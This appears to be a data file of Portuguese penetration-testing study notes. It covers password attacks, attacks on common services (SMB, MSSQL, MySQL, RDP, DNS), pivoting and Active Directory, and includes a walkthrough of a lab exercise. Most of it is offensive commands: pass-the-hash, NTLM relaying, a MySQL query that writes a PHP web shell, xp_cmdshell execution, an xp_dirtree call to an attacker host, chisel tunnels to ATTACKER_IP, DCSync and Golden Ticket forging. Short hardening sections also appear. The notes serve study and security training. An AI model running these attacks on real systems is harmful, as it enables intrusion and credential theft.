\`\`\`bash
nxc smb <TARGET_IP> -u Administrator -H 2b871d469ee1630c4606244080486316
evil-winrm -i <TARGET_IP> -u Administrator -H 2b871d469ee1630c4606244080486316
wmiexec.py -hashes :2b871d469ee1630c4606244080486316 Administrator@<TARGET_IP>
\`\`\`

### 3. Credential Hunting no Sistema de Arquivos
- **findstr para arquivos de configuração:**
\`\`\`cmd
findstr /s /i /p "password" C:\*.*
\`\`\`
- **Arquivos comuns com senhas em texto claro:** \`web.config\`, \`unattend.xml\`, \`sysvol\` scripts, cofres KeePass (\`.kdbx\`).
- **Ferramentas Especializadas:**
  - **Snaffler:** Busca em compartilhamentos SMB por arquivos de chaves, senhas e certificados.
  - **PowerHuntShares & MANSPIDER:** Automação de busca por arquivos sensíveis em compartilhamentos de rede.

### 4. Pass the Certificate & AD CS Attacks
- Abuso de serviços de certificado do Active Directory (AD CS).
- Relayer de autenticação NTLM para o endpoint HTTP do AD CS (ESC8 / PrinterBug).
- Ferramentas: \`printerbug.py\`, \`gettgtpkinit.py\`, Shadow Credentials com \`pywhisker\`.

---

## Walkthrough Completo da Avaliação de Passwords
1. Identificação do usuário Betty Jayde via gerador \`username-anarchy\`.
2. Ataque de Password Spraying em SSH com Hydra descobrindo a senha de acesso inicial.
3. Estabelecimento de pivô de rede usando \`ligolo-ng\`.
4. Execução do Snaffler na rede interna identificando um arquivo \`.kdbx\` do Password Safe v3.
5. Extração da hash com \`kdbx2john\` e quebra no John the Ripper.
6. Leitura da senha do Administrador do Domínio no Password Safe.
7. Extração do banco \`NTDS.dit\` do Domain Controller via \`secretsdump.py\` para obter o acesso total.

---
*Notas relacionadas:* [[Active Directory]], [[Shells & Payloads]], [[Footprinting]], [[Pivoting]]
`,
    createdAt: '2026-08-04T16:00:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
  {
    id: 'common-services',
    title: 'Attacking Common Services & Misconfigurations',
    category: 'Attacking Common Services',
    tags: ['common-services', 'smb', 'ftp', 'sql', 'mysql', 'mssql', 'rdp', 'dns', 'email', 'log4j', 'xp-cmdshell', 'ntlm-relay', 'bluekeep'],
    content: `# Attacking Common Services & Misconfigurations

Análise técnica e técnicas de exploração de vulnerabilidades e erros de configuração em serviços comuns de rede corporativa.

---

## Framework Geral de Análise de Ataques
Para cada serviço, analise:
1. **Source (Origem):** De onde vem o tráfego e qual nível de autenticação é exigido.
2. **Process (Processo):** Qual daemon/processo trata a requisição no sistema operacional.
3. **Privileges (Privilégios):** Sob qual conta o serviço executa (SYSTEM, root, service account).
4. **Destination (Destino):** Qual o objetivo final e impacto de um comprometimento.
*Exemplo histórico:* Vulnerabilidade Log4j (CVE-2021-44228) permitindo RCE em aplicações Java via cabeçalho HTTP JNDI.

---

## Ataques a Serviços de Compartilhamento

### 1. Attacking FTP (Portas 20 / 21)
- **Acesso Anônimo:**
\`\`\`bash
ftp <TARGET_IP>
# Usuário: anonymous / Senha: [enter ou e-mail]
\`\`\`
- **Ataque FTP Bounce:** Abuso da instrução \`PORT\` do FTP para realizar varreduras de portas internas através do servidor FTP.
- **CoreFTP CVE-2022-22836 (Path Traversal em PUT):** Envio de requisição HTTP \`PUT\` gravando arquivos arbitrários fora da raiz do servidor web.

### 2. Attacking SMB (Portas 139 / 445)
- **Null Sessions & Anonymous Enum:**
\`\`\`bash
rpcclient -U "" -N <TARGET_IP>
enum4linux-ng -A <TARGET_IP>
\`\`\`
- **Execução Remota de Comandos (com credenciais válidas):**
  - **PsExec:** Cria um serviço executável remoto no compartilhamento \`ADMIN$\`.
  - **SMBExec:** Executa comandos modificando chaves de registro do serviço sem gravar arquivo no disco.
  - **ATExec:** Utiliza o agendador de tarefas do Windows via RPC.
- **Envenenamento LLMNR/NBT-NS (Responder):**
Captura de solicitações de resolução de nomes na rede local e obtenção de hashes NetNTLMv2.
\`\`\`bash
responder -I eth0 -dwv
\`\`\`
- **NTLM Relaying:** Redirecionamento da autenticação capturada pelo Responder para sistemas que não exijam assinatura SMB (\`SMB Signing: Disabled\`).
\`\`\`bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
\`\`\`

---

## Ataques a Bancos de Dados SQL

### 1. MySQL (Porta 3306)
- **Comandos Úteis de Enumeração e Exploração:**
\`\`\`sql
SELECT version(), user(), database();
SELECT host, user, password FROM mysql.user;
\`\`\`
- **Leitura de Arquivos Locais (se \`secure_file_priv\` estiver vazio):**
\`\`\`sql
SELECT load_file('/etc/passwd');
\`\`\`
- **Gravação de Web Shell:**
\`\`\`sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
\`\`\`

### 2. MSSQL - Microsoft SQL Server (Porta 1433)
- **Habilitar e Executar \`xp_cmdshell\` (RCE):**
\`\`\`sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
\`\`\`
- **Automação OLE (sp_OACreate):** Método alternativo de execução de comandos se \`xp_cmdshell\` estiver bloqueado.
- **Captura de Hash NTLM via \`xp_dirtree\` / \`xp_fileexist\`:**
Força o servidor MSSQL a se autenticar no Responder do atacante:
\`\`\`sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share';
\`\`\`
- **Abuso de Impersonate (EXECUTE AS):**
\`\`\`sql
SELECT name, is_disabled FROM sys.server_principals WHERE can_login = 1;
EXECUTE AS LOGIN = 'sa';
\`\`\`
- **Servidores Vinculados (Linked Servers):** Encadeamento de consultas entre múltiplos servidores SQL corporativos para elevar privilégios.

---

## Ataques a RDP (Porta 3389)
- **Password Spray & Brute Force:**
\`\`\`bash
crowbar -b rdp -s <TARGET_IP>/32 -U users.txt -c 'Password123'
\`\`\`
- **Hijacking de Sessão RDP sem Senha (tscon.exe):** Se um atacante obtiver acesso SYSTEM, pode conectar-se a sessões de outros usuários conectados via \`tscon.exe\`:
\`\`\`cmd
query user
tscon 2 /dest:rdp-tcp#0
\`\`\`
- **Ataque BlueKeep (CVE-2019-0708):** RCE pré-autenticação em versões antigas do Windows.

---

## Ataques a DNS (Porta 53)
- **Transferência de Zona (AXFR):**
\`\`\`bash
dig axfr @<TARGET_IP> targetdomain.com
\`\`\`
- **Subdomain Takeover:** Ocorre quando um registro DNS CNAME aponta para um serviço de nuvem abandonado (ex: GitHub Pages, S3 Bucket).
- **DNS Spoofing / Cache Poisoning:** Injeção de respostas falsas via Ettercap ou ARP spoofing.

---

## Ataques a Serviços de Email (SMTP / IMAP / POP3)
- **Enumeração de Usuários:** \`VRFY\`, \`EXPN\`, \`RCPT TO\` via Telnet ou \`smtp-user-enum\`.
- **Spray de Credenciais em Office 365 / Exchange:** Usando \`o365spray\`.
- **Open Relay:** Servidor SMTP que aceita entregar e-mails para qualquer domínio externo sem autenticação. Testar com a ferramenta \`swaks\`:
\`\`\`bash
swaks --to victim@external.com --from test@targetdomain.com --server <TARGET_IP>
\`\`\`

---

## Walkthroughs dos Labs de Serviços
- **Lab Fácil:** Abuso de upload vulnerável no CoreFTP para gravar uma web shell PHP e explorar banco MySQL com credenciais padrão.
- **Lab Médio:** Identificação de transferência de zona DNS exposta para listar subdomínios e extração de chaves de e-mail em POP3.
- **Lab Difícil:** Acesso a compartilhamentos SMB restritos, abuso do recurso \`IMPERSONATE\` e \`Linked Servers\` no MSSQL para obter controle total do controlador de domínio.

---
*Notas relacionadas:* [[Footprinting]], [[Password Attacks]], [[Active Directory]], [[Pivoting]]
`,
    createdAt: '2026-08-04T12:00:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
  {
    id: 'pivoting-guide',
    title: 'Pivoting, Tunneling & Port Forwarding',
    category: 'Pivoting & Tunneling',
    tags: ['pivoting', 'tunneling', 'chisel', 'proxychains', 'ssh-tunnel', 'socat', 'meterpreter', 'rpivot', 'netsh', 'dnscat2', 'ptunnel', 'socksoverrdp'],
    content: `# Pivoting, Tunneling & Port Forwarding

Pivoting é a técnica de usar um host comprometido (pivot) para ter acesso e rotear tráfego para segmentos de rede internos inacessíveis diretamente.

---

## Conceitos Chave
- **Pivot Host / Foothold:** Máquina comprometida na rede de perímetro (Dual-Homed) com acesso a duas redes distintas.
- **Port Forwarding:** Redirecionamento de uma porta específica da máquina remota para a máquina local.
- **Dynamic Port Forwarding:** Criação de um servidor Proxy SOCKS (SOCKS4/SOCKS5) para rotear tráfego arbitrário de qualquer ferramenta.
- **Tunneling:** Encapsulamento de um protocolo de rede dentro de outro (ex: IP dentro de HTTP, SOCKS dentro de SSH).

---

## Descoberta de Rede no Pivot Host
Antes de estabelecer túneis, descubra hosts na rede interna:
- **Ping Sweep via Linux Bash:**
\`\`\`bash
for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i | grep "from"; done
\`\`\`
- **NetExec (nxc) SMB Scan:**
\`\`\`bash
nxc smb 172.16.5.0/24
\`\`\`
- **arp-scan & fping:**
\`\`\`bash
arp-scan -I eth1 --localnet
fping -a -g 172.16.5.0/24 2>/dev/null
\`\`\`

---

## Ttécnicas de Redirecionamento com SSH

### 1. SSH Local Port Forwarding (\`-L\`)
Redireciona uma porta da máquina do atacante para uma porta no destino através do servidor SSH:
\`\`\`bash
ssh -L 8080:172.16.5.15:80 user@<PIVOT_IP>
\`\`\`
*(Acessar \`http://localhost:8080\` abre o servidor web da máquina interna \`172.16.5.15\`)*

### 2. SSH Dynamic Port Forwarding (\`-D\` com Proxychains)
Cria um proxy SOCKS local na porta 9050:
\`\`\`bash
ssh -D 9050 -N -f user@<PIVOT_IP>
\`\`\`
Configuração do \`/etc/proxychains.conf\`:
\`\`\`ini
[ProxyList]
socks5 127.0.0.1 9050
\`\`\`
Execução de ferramentas via proxy:
\`\`\`bash
proxychains nmap -sT -Pn -p 21,22,80,445 172.16.5.15
proxychains evil-winrm -i 172.16.5.15 -u admin -p pass
\`\`\`

### 3. SSH Remote Reverse Port Forwarding (\`-R\`)
Usado quando a máquina pivot precisa enviar conexões de volta para o atacante:
\`\`\`bash
ssh -R 8000:localhost:80 user@<ATTACKER_IP>
\`\`\`

---

## Tunelamento e Pivoting com [[Metasploit]]
- **Autoroute no Meterpreter:**
\`\`\`text
meterpreter > run autoroute -s 172.16.5.0/24
\`\`\`
- **Servidor Proxy SOCKS no Metasploit:**
\`\`\`text
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
\`\`\`
- **Port Forwarding no Meterpreter:**
\`\`\`text
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.15
\`\`\`

---

## Redirecionamento com Socat
Utilitário versátil em Linux para redirecionar conexões de portas:
- **Reverse Port Forwarding:**
\`\`\`bash
socat TCP-LISTEN:8080,fork TCP:172.16.5.15:80
\`\`\`

---

## Outras Ferramentas e Protocolos de Tunelamento

### 1. [[Chisel]] (SOCKS5 sobre HTTP/WebSockets)
- **Servidor no Atacante:**
\`\`\`bash
./chisel server -p 8000 --reverse
\`\`\`
- **Cliente na Vítima (Pivot):**
\`\`\`bash
chisel client <ATTACKER_IP>:8000 R:socks
\`\`\`

### 2. RPIVOT & Plink
- **rpivot:** Túnel SOCKS reverso com suporte a proxies NTLM corporativos.
- **Plink.exe:** Linha de comando do PuTTY para Windows utilizada para criar túneis SSH reversos.

### 3. Windows Netsh
Redirecionamento nativo do Windows sem necessidade de instalar ferramentas externas:
\`\`\`cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.5.15
\`\`\`

### 4. Tunelamento DNS & ICMP
- **DNS Tunneling (dnscat2):** Encapsula tráfego em consultas DNS TXT/CNAME para bypassar firewalls rígidos.
- **ICMP Tunneling (ptunnel-ng):** Transfere dados dentro do corpo de pacotes ICMP Echo Request/Reply.

### 5. RDP & SOCKS (SocksOverRDP)
Permite criar um canal SOCKS proxy dentro de uma sessão RDP ativa usando canais virtuais dinâmicos (Dynamic Virtual Channels).

---

## Detecção & Prevenção
- Segmentação estrita de rede (VLANs com Zero Trust).
- Monitoramento de conexões persistentes de longa duração (SIEM / EDR).
- Inspeção profunda de pacotes (DPI) para identificar protocolos encapsulados em HTTP ou DNS.

---
*Notas relacionadas:* [[Chisel]], [[Shells & Payloads]], [[Active Directory]], [[Password Attacks]]
`,
    createdAt: '2026-08-05T11:00:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
  {
    id: 'active-directory',
    title: 'Active Directory Enumeration & Attacks',
    category: 'Active Directory',
    tags: ['active-directory', 'kerberos', 'kerberoasting', 'asreproasting', 'dcsync', 'bloodhound', 'powerview', 'responder', 'nopac', 'printnightmare', 'gpo', 'domain-trusts'],
    content: `# Active Directory Enumeration & Attacks

O Active Directory (AD) é a estrutura central de gerenciamento de identidades, autenticação (Kerberos e NTLM) e políticas de grupo em ambientes corporativos Windows.

---

## Suíte Essencial de Ferramentas
- **PowerView / SharpView:** Scripts em PowerShell e C# para enumeração profunda de objetos e permissões.
- **BloodHound / SharpHound:** Coleta e visualização em grafo de caminhos de ataque e relacionamentos de privilégios no AD.
- **Kerbrute:** Validação e enumeração de usuários de domínio via requisições Kerberos sem bloquear contas.
- **Impacket Suite:** \`GetUserSPNs.py\`, \`GetNPUsers.py\`, \`secretsdump.py\`, \`psexec.py\`, \`wmiexec.py\`, \`raiseChild.py\`.
- **Responder & Inveigh:** Poisoning de LLMNR/NBT-NS e mDNS.
- **Rubeus:** Ferramenta C# para interações avançadas com tickets Kerberos (TGT/TGS, AS-REP, Golden/Silver tickets).

---

## Reconhecimento Externo & Descoberta Passiva/Ativa
- **Wireshark & tcpdump:** Captura de pacotes buscando tráfego LDAP, Kerberos e solicitações de transmissão na rede.
- **Responder em Modo Passivo:** \`responder -I eth0 -A\` para mapear máquinas ativas sem enviar pacotes.
- **Enumeração de Usuários com Kerbrute:**
\`\`\`bash
kerbrute userenum -d domain.local --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
\`\`\`

---

## Ataques Iniciais & Poisoning

### 1. LLMNR / NBT-NS Poisoning (Responder)
Captura de hashes NetNTLMv2 de usuários que tentam acessar recursos inexistentes na rede local:
\`\`\`bash
responder -I eth0 -dwv
\`\`\`
Quebra da hash NetNTLMv2 no Hashcat:
\`\`\`bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
\`\`\`

### 2. Password Spraying no Domínio
Utilização do \`crackmapexec\` ou \`DomainPasswordSpray.ps1\` com intervalo para não acionar bloqueio:
\`\`\`bash
nxc smb <DC_IP> -u users.txt -p 'Fall2026!' --continue-on-success
\`\`\`

---

## Enumeração de Controles de Segurança
- **Windows Defender:** \`Get-MpComputerStatus\`
- **AppLocker & Constrained Language Mode (CLM):** Verificar \`$ExecutionContext.SessionState.LanguageMode\`.
- **LAPS (Local Administrator Password Solution):** Verificar permissões de leitura do atributo \`ms-MNS-HostMachinePassword\` usando \`LAPSToolkit.ps1\`.

---

## Enumeração do AD

### A Partir do Linux
\`\`\`bash
# Enumeração LDAP com windapsearch
python3 windapsearch.py -d domain.local --dc-ip <DC_IP> -u user -p pass --custom "objectClass=user"
# Coleta para o BloodHound
bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -c All
\`\`\`

### A Partir do Windows
\`\`\`powershell
# PowerView
Get-DomainUser
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainComputer
Get-DomainGPO
# Execução do SharpHound
.\SharpHound.exe -c All --zipfilename domain_data.zip
\`\`\`

---

## Vetores Principais de Ataque e Exploração

### 1. [[Kerberoasting]]
Ataque onde qualquer usuário autenticado solicita um ticket TGS para contas com SPN registrado e quebra a hash NTLM offline:
- **Via Impacket:**
\`\`\`bash
GetUserSPNs.py -dc-ip <DC_IP> domain.local/user:pass -request -outputfile kerberoast.hashes
\`\`\`
- **Quebra com Hashcat:**
\`\`\`bash
hashcat -m 13100 kerberoast.hashes rockyou.txt
\`\`\`

### 2. AS-REPRoasting
Ataque contra contas de usuários que possuem a opção "Do not require Kerberos preauthentication" ativada:
\`\`\`bash
GetNPUsers.py -dc-ip <DC_IP> domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes rockyou.txt
\`\`\`

### 3. Abuso de ACLs & ACEs
Exploração de permissões de Controle de Acesso no AD:
- **Permissões Críticas:**
  - \`ForceChangePassword\`: Permite redefinir a senha do usuário alvo.
  - \`GenericAll\` / \`GenericWrite\`: Controle total ou modificação de atributos do objeto.
  - \`WriteDACL\`: Permite alterar a ACL do objeto para conceder a si mesmo acesso total.
  - \`AddSelf\`: Adicionar a si mesmo a um grupo privilegiado.
- **Comando PowerView para Redefinir Senha:**
\`\`\`powershell
Set-DomainUserPassword -Identity victim_user -AccountPassword 'NewPassword123!'
\`\`\`

### 4. [[DCSync]] Attack
Abuso do protocolo DRSUAPI com as permissões \`DS-Replication-Get-Changes\` e \`DS-Replication-Get-Changes-All\` para solicitar hashes NTLM do banco [[NTDS.dit]] diretamente ao Domain Controller:
\`\`\`bash
secretsdump.py -just-dc domain.local/admin_user:password@<DC_IP>
\`\`\`

---

## Vulnerabilidades Críticas de AD
- **NoPac (CVE-2021-42278 & CVE-2021-42287):** Falsificação do nome de computador e requisição de ticket Kerberos para personificar o Domain Controller.
- **PetitPotam (CVE-2021-36942):** Força autenticação NTLM de um controlador de domínio contra um servidor malicioso do atacante.
- **GPP Passwords (gpp-decrypt):** Extração de senhas criptografadas em arquivos \`Groups.xml\` legados no SYSVOL.

---

## Domain Trusts & Escalada entre Florestas
- **Parent-Child Trusts:** Relações de confiança bidirecionais automáticas.
- **Ataque com SID History / ExtraSids (Golden Ticket):**
Injeção do SID do grupo \`Enterprise Admins\` do domínio pai (\`S-1-5-21-...-519\`) dentro do ticket TGT gerado no domínio filho:
\`\`\`bash
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <CHILD_SID> -extra-sids <PARENT_ENTERPRISE_ADMINS_SID> Administrator
\`\`\`

---

## AD Hardening & Recomendações
- Implementar grupo **Protected Users** para contas privilegiadas.
- Desabilitar protocolos legados (LLMNR, NBT-NS, NTLMv1, SMBv1).
- Habilitar **SMB Signing** e **LDAP Channel Binding**.
- Auditorias periódicas com PingCastle, ADRecon e BloodHound.

---
*Notas relacionadas:* [[Password Attacks]], [[Shells & Payloads]], [[Pivoting]], [[Footprinting]]
`,
    createdAt: '2026-08-05T09:00:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
];
